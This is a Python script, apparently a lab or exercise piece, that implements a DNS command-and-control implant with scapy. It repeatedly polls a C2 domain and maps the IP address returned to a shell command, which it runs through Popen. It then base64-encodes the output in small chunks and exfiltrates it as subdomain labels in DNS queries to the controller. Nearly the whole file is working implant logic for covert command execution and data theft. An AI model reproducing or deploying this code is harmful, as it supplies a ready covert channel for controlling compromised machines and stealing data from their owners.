import base64
import ipaddress
from subprocess import PIPE, Popen
from time import sleep

from scapy.all import *
from scapy.layers.dns import DNSRR, DNS, DNSQR
from scapy.layers.inet import IP, UDP

SERVER_IP = '127.0.0.1'
DNS_FILTER = f"udp and port 53 and src {SERVER_IP}"
DOMAIN = "a.simba.com"
TIMEOUT = 7
PORT = 53
SUPPORTED_TYPES = {
    "A": "1"
}

IP_TO_CMD = {
    "5.5.5.5": f"ping -c 2 {SERVER_IP}"
}

C2_DOMAIN = "a.simba.com"
C2_ANSWER = "5.5.5.5"
C2_SLEEP_SECONDS = 2
PART_SIZE = 4
EXFIL_SUFFIX = b".c.simba.com"

MAX_DOMAIN_NAME_LENGTH = 254


def is_supported_dns_type(reqtype):
    if not isinstance(reqtype, str):
        raise TypeError("reqtype should be a string.")

    return reqtype in SUPPORTED_TYPES


def is_valid_domain_name(name):
    if not isinstance(name, str):
        raise TypeError("name should be a string.")

    if len(name) > MAX_DOMAIN_NAME_LENGTH:
        return False

    return re.search(r"^[a-zA-Z\d-]{,63}(\.[a-zA-Z\d-]{,63})*$", name) is not None


def is_valid_ip_address(ip):
    if not isinstance(ip, str):
        raise TypeError("ip should not be a string.")

    try:
        ipaddress.ip_address(str(ip))
        return True

    except(ValueError, ipaddress.AddressValueError):
        return False


def dns_req(name, server, reqtype='A'):
    if not isinstance(name, str):
        raise TypeError("name should be a string.")

    if not isinstance(server, str):
        raise TypeError("server should be a string.")

    if not isinstance(reqtype, str):
        raise TypeError("reqtype should be a string.")

    if not is_valid_domain_name(name):
        raise ValueError("name should be a valid domain name.")

    if not is_valid_ip_address(server):
        raise ValueError("ip should be a valid ip address.")

    if not is_supported_dns_type(reqtype):
        raise ValueError("reqtype should be in {}.".format(SUPPORTED_TYPES.keys()))

    dns_req = IP(dst=SERVER_IP) / UDP(sport=RandShort(), dport=PORT) / DNS(rd=1, qd=DNSQR(qname=name, qtype=reqtype))
    time.sleep(1)
    answer = sr1(dns_req, timeout=TIMEOUT, verbose=False)

    output = []

    if answer:
        if DNS in answer and (answer[DNS].ancount > 0 and DNSRR in answer):
            for idx in range(answer[DNS].ancount):
                if answer[DNSRR][idx].type == SUPPORTED_TYPES[reqtype]:
                    output.append(answer[DNSRR][idx].rdata)

    return output


def exfil_data(secret):
    try:
        for part in secret:
            exfil_host = part + EXFIL_SUFFIX
            query_pkt = IP(dst=SERVER_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname=exfil_host))
            send(query_pkt)
        return True
    except Exception:
        return False


def execute_command(command):
    try:
        print("[+] Executing command:\n{}".format(command))
        prompt = Popen(command.split(" "), stdout=PIPE)
        cmd_res = prompt.communicate()[0]
        prompt.terminate()
        prompt.kill()
        encoded_parts = [base64.urlsafe_b64encode(cmd_res[i:i + PART_SIZE]) \
                         for i in range(0, len(cmd_res), PART_SIZE)]
        return encoded_parts

    except:
        return []


def perform_C2_action():
    try:
        while True:
            response = dns_req(C2_DOMAIN, SERVER_IP)
            if response and C2_ANSWER in response:
                command_code = response[0]
                print("[+] C2 is alive!")
                output_parts = execute_command(IP_TO_CMD[command_code])
                print("[-] Attempting to exfiltrate back to CnC...\n")
                exfil_data(output_parts)

            else:
                print("[-] C2 is not alive!")
            sleep(C2_SLEEP_SECONDS)

    except KeyboardInterrupt:
        return


def main():
    perform_C2_action()


if __name__ == "__main__":
    main()


